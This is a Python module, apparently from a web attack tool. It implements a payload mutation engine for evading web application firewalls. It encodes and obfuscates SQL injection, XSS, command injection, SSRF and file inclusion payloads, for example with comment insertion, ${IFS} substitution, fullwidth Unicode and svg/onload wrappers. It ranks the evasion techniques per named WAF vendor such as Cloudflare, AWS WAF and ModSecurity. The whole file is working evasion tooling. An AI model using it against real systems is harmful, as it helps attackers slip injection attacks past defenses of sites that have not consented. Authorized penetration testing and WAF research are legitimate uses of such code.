"""Payload mutation engine — pure-function strategies for WAF evasion."""
from __future__ import annotations

import re
import struct
import socket
from typing import Callable, Dict, List
from urllib.parse import quote


# ---------------------------------------------------------------------------
# Individual mutation strategies (pure: str → str)
# ---------------------------------------------------------------------------

def _double_url_encode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def _unicode_fullwidth(payload: str) -> str:
    out: list[str] = []
    for ch in payload:
        cp = ord(ch)
        if 0x21 <= cp <= 0x7E:
            out.append(chr(cp + 0xFEE0))
        else:
            out.append(ch)
    return "".join(out)


def _hex_encode(payload: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in payload)


def _case_alternation(payload: str) -> str:
    out: list[str] = []
    upper = True
    for ch in payload:
        if ch.isalpha():
            out.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            out.append(ch)
    return "".join(out)


def _comment_insertion(payload: str) -> str:
    """Insert inline SQL comments between every alpha character (S/**/E/**/L/**/E/**/C/**/T)."""
    out: list[str] = []
    prev_alpha = False
    for ch in payload:
        if ch.isalpha() and prev_alpha:
            out.append("/**/")
        out.append(ch)
        prev_alpha = ch.isalpha()
    return "".join(out)


def _whitespace_sub(payload: str) -> str:
    return payload.replace(" ", "\t")


def _newline_sub(payload: str) -> str:
    return payload.replace(" ", "\n")


def _svg_payload(payload: str) -> str:
    inner = payload
    for tag in ("<script>", "</script>", "<img", ">"):
        inner = inner.replace(tag, "")
    inner = inner.strip()
    return f"<svg/onload={inner}>"


def _img_onerror(payload: str) -> str:
    inner = payload
    for tag in ("<script>", "</script>", "<img", ">"):
        inner = inner.replace(tag, "")
    inner = inner.strip()
    return f'<img src=x onerror="{inner}">'


def _ifs_substitution(payload: str) -> str:
    return payload.replace(" ", "${IFS}")


def _ip_encoding(payload: str) -> str:
    """Convert dotted-quad IPs in the payload to their decimal equivalents."""
    def _replace(m: re.Match) -> str:
        ip_str = m.group(0)
        try:
            packed = socket.inet_aton(ip_str)
            return str(struct.unpack("!I", packed)[0])
        except OSError:
            return ip_str
    return re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", _replace, payload)


def _concat_char(payload: str) -> str:
    """Convert string to SQL CONCAT(CHAR(n),CHAR(n),...) form."""
    chars = ",".join(f"CHAR({ord(c)})" for c in payload)
    return f"CONCAT({chars})"


def _html_entity_encode(payload: str) -> str:
    return "".join(f"&#{ord(c)};" for c in payload)


def _backtick_keywords(payload: str) -> str:
    """Wrap SQL keywords in backticks: SELECT → `SELECT`."""
    kw = r"\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE|AND|OR|DROP|TABLE)\b"
    return re.sub(kw, r"`\1`", payload, flags=re.IGNORECASE)


# ---------------------------------------------------------------------------
# Strategy registry
# ---------------------------------------------------------------------------

MutationFn = Callable[[str], str]

MUTATION_STRATEGIES: Dict[str, MutationFn] = {
    "double_url_encode": _double_url_encode,
    "unicode_fullwidth": _unicode_fullwidth,
    "hex_encode": _hex_encode,
    "case_alternation": _case_alternation,
    "comment_insertion": _comment_insertion,
    "whitespace_sub": _whitespace_sub,
    "newline_sub": _newline_sub,
    "svg_payload": _svg_payload,
    "img_onerror": _img_onerror,
    "ifs_substitution": _ifs_substitution,
    "ip_encoding": _ip_encoding,
    "concat_char": _concat_char,
    "html_entity_encode": _html_entity_encode,
    "backtick_keywords": _backtick_keywords,
}

# Per-WAF vendor strategy ordering (most likely to succeed first)
WAF_STRATEGY_MAP: Dict[str, List[str]] = {
    "cloudflare": [
        "double_url_encode", "unicode_fullwidth", "case_alternation",
        "comment_insertion", "hex_encode", "newline_sub",
        "html_entity_encode", "concat_char",
    ],
    "modsecurity": [
        "comment_insertion", "whitespace_sub", "hex_encode",
        "case_alternation", "newline_sub", "backtick_keywords",
        "double_url_encode", "unicode_fullwidth",
    ],
    "aws_waf": [
        "double_url_encode", "case_alternation", "unicode_fullwidth",
        "comment_insertion", "hex_encode", "concat_char",
        "whitespace_sub", "html_entity_encode",
    ],
    "imperva": [
        "unicode_fullwidth", "double_url_encode", "hex_encode",
        "comment_insertion", "case_alternation", "whitespace_sub",
        "newline_sub", "concat_char",
    ],
    "akamai": [
        "double_url_encode", "hex_encode", "unicode_fullwidth",
        "case_alternation", "comment_insertion", "newline_sub",
        "html_entity_encode", "backtick_keywords",
    ],
    "sucuri": [
        "case_alternation", "comment_insertion", "whitespace_sub",
        "hex_encode", "double_url_encode",
    ],
    "f5_bigip": [
        "comment_insertion", "case_alternation", "whitespace_sub",
        "hex_encode", "double_url_encode",
    ],
    "barracuda": [
        "double_url_encode", "case_alternation", "comment_insertion",
        "hex_encode", "whitespace_sub",
    ],
    "fortiweb": [
        "unicode_fullwidth", "case_alternation", "comment_insertion",
        "hex_encode", "double_url_encode",
    ],
    "wordfence": [
        "case_alternation", "comment_insertion", "hex_encode",
        "double_url_encode", "unicode_fullwidth",
    ],
    "generic": [
        "double_url_encode", "case_alternation", "comment_insertion",
        "hex_encode", "unicode_fullwidth",
    ],
}

# Preferred strategies per vulnerability type
_VULN_STRATEGIES: Dict[str, List[str]] = {
    "sqli": [
        "case_alternation", "comment_insertion", "whitespace_sub",
        "newline_sub", "hex_encode", "concat_char", "backtick_keywords",
        "double_url_encode", "unicode_fullwidth",
    ],
    "xss": [
        "svg_payload", "img_onerror", "html_entity_encode",
        "unicode_fullwidth", "double_url_encode", "hex_encode",
        "case_alternation",
    ],
    "cmdi": [
        "ifs_substitution", "hex_encode", "newline_sub",
        "double_url_encode", "unicode_fullwidth",
    ],
    "ssrf": [
        "ip_encoding", "double_url_encode", "hex_encode",
        "unicode_fullwidth",
    ],
    "lfi": [
        "double_url_encode", "hex_encode", "unicode_fullwidth",
        "newline_sub",
    ],
}

MAX_VARIANTS = 5


class PayloadMutator:
    """Generate evasion variants for a given payload + vulnerability type + WAF vendor."""

    def mutate(
        self,
        payload: str,
        vuln_type: str,
        waf_vendor: str = "generic",
    ) -> List[Dict[str, str]]:
        strategies = self._select_strategies(vuln_type, waf_vendor)
        variants: List[Dict[str, str]] = []
        seen: set[str] = set()

        for name in strategies:
            fn = MUTATION_STRATEGIES.get(name)
            if fn is None:
                continue
            mutated = fn(payload)
            if mutated == payload or mutated in seen:
                continue
            seen.add(mutated)
            variants.append({"strategy": name, "payload": mutated})
            if len(variants) >= MAX_VARIANTS:
                break

        return variants

    def mutate_batch(
        self,
        payloads: List[str],
        vuln_type: str,
        waf_vendor: str = "generic",
    ) -> List[Dict[str, str]]:
        all_variants: List[Dict[str, str]] = []
        for p in payloads:
            all_variants.append({"strategy": "original", "payload": p})
            all_variants.extend(self.mutate(p, vuln_type, waf_vendor))
        return all_variants

    def _select_strategies(self, vuln_type: str, waf_vendor: str) -> List[str]:
        waf_prefs = WAF_STRATEGY_MAP.get(waf_vendor, WAF_STRATEGY_MAP["generic"])
        vuln_prefs = _VULN_STRATEGIES.get(vuln_type, [])

        # Intersection preserving waf_prefs order, boosted by vuln_prefs relevance
        combined = [s for s in waf_prefs if s in vuln_prefs]
        for s in waf_prefs:
            if s not in combined:
                combined.append(s)
        return combined[:MAX_VARIANTS + 3]
